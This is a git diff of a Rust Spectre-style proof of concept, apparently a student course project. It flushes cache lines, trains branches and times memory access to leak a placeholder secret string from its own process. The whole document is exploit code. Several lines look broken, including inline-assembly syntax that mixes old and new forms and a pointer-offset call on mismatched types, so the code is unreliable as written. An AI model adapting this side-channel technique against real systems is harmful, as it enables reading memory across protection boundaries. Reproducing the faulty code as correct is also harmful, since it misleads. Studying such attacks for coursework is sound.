@@ -1,9 +1,11 @@
+#![feature(asm)]
+
 extern crate core_affinity;
+use std::arch::asm;
 use std::thread;
 use std::sync::atomic::{AtomicU64, Ordering};
 use rand::seq::SliceRandom;
 use rand::thread_rng;
-use std::arch::asm;
 
 const CACHE_HIT_THRESHOLD: u64 = 80;
 const NUM_TRIES: u64 = 1000;
@@ -17,24 +19,21 @@ const SECRET: &str = "EECS 573";
 // Donayam's suggestion
 static TIMER_COUNTER: AtomicU64 = AtomicU64::new(0);
 
-fn rdtsc() -> u64 {
-    let high: u32;
-    let low: u32;
-    unsafe {
-        std::arch::asm::asm!("rdtsc", out("eax") low, out("edx") high);
-    }
-    (high as u64) << 32 | low as u64
-}
-
 fn high_speed_timer() {
     loop {
         TIMER_COUNTER.fetch_add(1, Ordering::Relaxed);
     }
 }
 
+// get a variable for fast and slow cache accesses
+// if i can get that working, then we can flush cache
+// get loops working, must access for ~a lot of cycles (~20 or something in c++ code)
+// when hit, it cycles a lot more (maybe 3x more?)
+// X can be any variable, just a variable
 unsafe fn clflush(addr: *const u8) {
-    std::arch::asm::asm!("clflush [$0]", in(reg) addr);
+    asm!("clflush [$0]" :: "r"(addr) : "memory");
 }
+
 
 fn init_attack() -> (Vec<bool>, Vec<u8>) {
     let mut is_attack = vec![false; TRAINING_LOOPS as usize];
@@ -113,7 +112,7 @@ fn fetch_function(arr1: &[u8], arr2: &[u8], idx: usize, results: &mut [u32; 256]
             // Calculate the index for arr2 based on arr1
             let arr2_idx = arr1_idx * 512;
             
-            // Simulate cache access time measurement (you may need to adjust this)
+            // Simulate cache access time measurement using rdtscp
             let mut time1: u64;
             let mut time2: u64;
             let junk: u64 = 0;
@@ -143,19 +142,21 @@ fn fetch_function(arr1: &[u8], arr2: &[u8], idx: usize, results: &mut [u32; 256]
 }
 
 fn main() {
-    // Set the CPU affinity for the main thread
-    core_affinity::set_for_current(core_affinity::get(core_affinity::CpuSet::new(0)).unwrap());
-
     // Create a separate thread for high-speed timer
     let timer_thread = thread::spawn(|| high_speed_timer());
 
     // This is where you would set up shared memory for arr1 and arr2, as in the C++ code.
     // You'll need to replace these placeholders with actual memory setup.
-    let arr1 = [16, 93, 45, 96, 4, 8, 41, 203, 15, 49, 56, 59, 62, 97, 112, 186];
+    let arr1 = [16, 93, 45, 96, 4, 8, 41, 203, 15, 49, 56, 59, 62, 97, 112];
     let arr2 = [0; 256 * 512]; // Placeholder, initialize with appropriate values
 
     let arr1_size = arr1.len();
-    let target_idx = SECRET.as_ptr() as usize - arr1.as_ptr() as usize;
+    let mut target_idx: usize = 0;
+    unsafe {
+        target_idx = (SECRET.as_ptr().offset_from(arr1.as_ptr())) as usize;
+        println!("Distance to secret array = {}", target_idx);
+    }
+
     let (is_attack, attack_pattern) = init_attack();
     let guessed_secret = read_memory_byte(target_idx, arr1_size, is_attack, &arr1, &arr2, attack_pattern);
 
